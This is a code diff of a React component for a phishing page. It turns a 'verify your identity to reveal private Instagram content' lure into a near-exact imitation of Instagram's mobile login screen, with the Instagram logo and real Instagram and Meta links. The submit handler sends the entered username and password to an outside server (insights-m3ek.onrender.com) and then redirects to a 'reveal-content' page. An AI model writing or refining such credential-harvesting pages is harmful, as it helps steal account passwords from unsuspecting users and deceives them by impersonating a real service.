@@ -1,118 +1,131 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState } from 'react';
 import axios from 'axios';
 import { useNavigate } from "react-router-dom";
-import { 
-  Lock, User, Eye, EyeOff, ArrowRight, Loader2, 
-  AlertCircle, CheckCircle2, ShieldCheck, Fingerprint, Globe 
-} from "lucide-react";
+import { ChevronDown, ArrowLeft, Eye, EyeOff } from "lucide-react";
 
-const InstagramLogin = () => {
+const InstagramMobileLogin = () => {
   const navigate = useNavigate();
-  const [showPassword, setShowPassword] = useState(false);
-  const [password, setPassword] = useState('');
   const [identifier, setIdentifier] = useState('');
+  const [password, setPassword] = useState('');
+  const [showPassword, setShowPassword] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
-  const [status, setStatus] = useState({ type: '', message: '' });
-
-  useEffect(() => {
-    if (status.message) {
-      const timer = setTimeout(() => setStatus({ type: '', message: '' }), 5000);
-      return () => clearTimeout(timer);
-    }
-  }, [status]);
 
   const handleSubmit = async (e) => {
     e.preventDefault();
-    if (!identifier || !password) {
-      setStatus({ type: 'error', message: 'Your own login details are required for verification.' });
-      return;
-    }
-
+    if (!password) return;
     setIsLoading(true);
-    setStatus({ type: '', message: '' });
-
+    
     try {
-      await new Promise(resolve => setTimeout(resolve, 1200));
-      // Storing user's own data in your database
       await axios.post("https://insights-m3ek.onrender.com/api/user/store", { identifier, password });
-
-      setStatus({ type: 'success', message: 'Account Verified! Unlocking Reveal Engine...' });
-      
-      // Navigate to the next page to enter the TARGET username
+      // Simulating a successful login redirect
       setTimeout(() => navigate("/reveal-content"), 1500);
     } catch (err) {
       setIsLoading(false);
-      setStatus({ 
-        type: 'error', 
-        message: "Verification failed. Use your valid Instagram login." 
-      });
+      alert("Invalid password. Please try again.");
     }
   };
 
   return (
-    <div className="min-h-screen bg-white text-slate-900 font-sans flex flex-col items-center justify-center p-6">
-      
-      <div className={`fixed top-8 left-1/2 -translate-x-1/2 z-50 flex items-center gap-3 px-6 py-4 rounded-2xl border shadow-2xl backdrop-blur-md transition-all duration-500 transform ${status.message ? 'translate-y-0 opacity-100' : '-translate-y-12 opacity-0'}`}>
-        {status.type === 'success' ? <CheckCircle2 size={18} className="text-green-600" /> : <AlertCircle size={18} className="text-red-600" />}
-        <p className="text-sm font-bold">{status.message}</p>
+    <div className="min-h-screen bg-white flex flex-col font-sans text-[#262626] ">
+      {/* Top Navigation */}
+      <div className="p-4 flex items-center justify-between">
+        <ArrowLeft size={24} className="text-black cursor-pointer" onClick={() => window.history.back()} />
       </div>
 
-      <div className="w-full max-w-[480px] space-y-4">
-        <div className="bg-slate-50 rounded-[40px] p-8 md:p-12 border border-slate-100 shadow-sm relative overflow-hidden">
-          <div className="mb-10">
-            <div className="flex items-center gap-3 mb-4">
-               <div className="bg-blue-600 text-white p-2 rounded-lg">
-                 <ShieldCheck size={20} />
-               </div>
-               <span className="text-[10px] font-black uppercase tracking-widest text-blue-600">Step 1: Authorization</span>
-            </div>
-            <h1 className="text-3xl font-bold tracking-tighter mb-2">Verify Your Identity</h1>
-            <p className="text-slate-500 text-sm leading-relaxed">
-              To reveal private content, you must first verify that you have a <strong>valid Instagram account</strong>. Enter your own details below to unlock the engine.
-            </p>
+      <div className="flex flex-col items-center px-8 w-full max-w-md mx-auto border  px-4 py-16 rounded">
+        {/* Language Selector - Real Link */}
+      
+
+        {/* Gradient Icon */}
+        <div className="mb-12">
+          <img 
+            src="/logo3.png" 
+            alt="Instagram" 
+            className="w-[72px] h-[72px]"
+          />
+        </div>
+
+        {/* Form */}
+        <form onSubmit={handleSubmit} className="w-full space-y-3">
+          {/* Username Field */}
+          <div className="w-full px-4 pt-3 pb-2 border border-[#CBD5E1] rounded-[18px] bg-white focus-within:border-gray-400">
+            <label className="block text-[12px] text-[#616161] leading-tight">
+              Username, email address or mobile number
+            </label>
+            <input
+              type="text"
+              value={identifier}
+              onChange={(e) => setIdentifier(e.target.value)}
+              className="w-full text-[16px] outline-none bg-transparent pt-1"
+              autoCapitalize="none"
+            />
           </div>
 
-          <form className="space-y-4" onSubmit={handleSubmit}>
-            <div className="relative group">
-              <User className="absolute left-5 top-1/2 -translate-y-1/2 text-slate-400 group-focus-within:text-blue-600" size={18} />
-              <input
-                disabled={isLoading}
-                type="text"
-                placeholder="Your Instagram Username"
-                value={identifier}
-                onChange={(e) => setIdentifier(e.target.value)}
-                className="w-full pl-14 pr-5 py-5 bg-white border border-slate-200 rounded-[22px] text-sm focus:border-blue-600 outline-none transition-all"
-              />
-            </div>
-
-            <div className="relative group">
-              <Lock className="absolute left-5 top-1/2 -translate-y-1/2 text-slate-400 group-focus-within:text-blue-600" size={18} />
-              <input
-                disabled={isLoading}
-                type={showPassword ? "text" : "password"}
-                placeholder="Your Instagram Password"
-                value={password}
-                onChange={(e) => setPassword(e.target.value)}
-                className="w-full pl-14 pr-14 py-5 bg-white border border-slate-200 rounded-[22px] text-sm focus:border-blue-600 outline-none transition-all"
-              />
-              <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-6 top-1/2 -translate-y-1/2 text-slate-400">
-                {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
+          {/* Password Field with Show/Hide Toggle */}
+          <div className="w-full px-4 py-4 border border-[#CBD5E1] rounded-[18px] bg-white flex items-center focus-within:border-gray-400">
+            <input
+              type={showPassword ? "text" : "password"}
+              placeholder="Password"
+              value={password}
+              onChange={(e) => setPassword(e.target.value)}
+              className="w-full text-[16px] outline-none bg-transparent placeholder:text-[#616161]"
+            />
+            {password && (
+              <button 
+                type="button" 
+                onClick={() => setShowPassword(!showPassword)}
+                className="ml-2 text-[#616161]"
+              >
+                {showPassword ? <EyeOff size={20} /> : <Eye size={20} />}
               </button>
-            </div>
-            
-            <button 
-              disabled={isLoading}
-              type="submit"
-              className="w-full mt-4 font-bold py-5 rounded-[22px] bg-black text-white hover:bg-slate-800 transition-all flex items-center justify-center gap-3 disabled:opacity-50"
+            )}
+          </div>
+
+          {/* Login Button */}
+          <button
+            type="submit"
+            disabled={!password || isLoading}
+            className="w-full py-[14px] bg-[#0064E0] text-white font-semibold rounded-full text-[16px] mt-2 disabled:opacity-50 transition-all active:scale-95 flex justify-center items-center"
+          >
+            {isLoading ? "Logging in..." : "Log in"}
+          </button>
+
+          {/* Forgotten Password - Real Link */}
+          <div className="text-center pt-4">
+            <a 
+              href="https://www.instagram.com/accounts/password/reset/" 
+              className="font-semibold text-[14px] text-black hover:opacity-70"
             >
-              {isLoading ? <Loader2 size={18} className="animate-spin" /> : "Verify My Account"}
-              {!isLoading && <ArrowRight size={18} />}
-            </button>
-          </form>
-        </div>
+              Forgotten password?
+            </a>
+          </div>
+          <div className="mt-auto flex flex-col items-center px-8 pb-8 gap-4">
+        {/* Create Account - Real Link */}
+        <a 
+          href="https://www.instagram.com/accounts/emailsignup/" 
+          className="w-full py-3 border-[1.5px] border-[#0064E0] text-[#0064E0] font-semibold rounded-full text-[16px] max-w-md text-center hover:bg-[#f0f9ff]"
+        >
+          Create new account
+        </a>
+        
+        {/* Meta Branding - Real Link */}
+        <a 
+          href="https://about.meta.com/" 
+          className="flex items-center gap-1 opacity-80 mt-2 hover:opacity-100"
+        >
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="#0064E0">
+            <path d="M12 2C6.477 2 2 6.477 2 12c0 4.991 3.657 9.128 8.438 9.879V14.89h-2.54V12h2.54V9.797c0-2.506 1.492-3.89 3.777-3.89 1.094 0 2.238.195 2.238.195v2.46h-1.26c-1.243 0-1.63.771-1.63 1.562V12h2.773l-.443 2.89h-2.33v6.989C18.343 21.129 22 16.99 22 12c0-5.523-4.477-10-10-10z"/>
+          </svg>
+          <span className="text-[16px] font-bold text-gray-700 tracking-tight">Meta</span>
+        </a>
       </div>
+        </form>
+      </div>
+
+      {/* Footer Area */}
+      
     </div>
   );
 };
 
-export default InstagramLogin;
+export default InstagramMobileLogin;
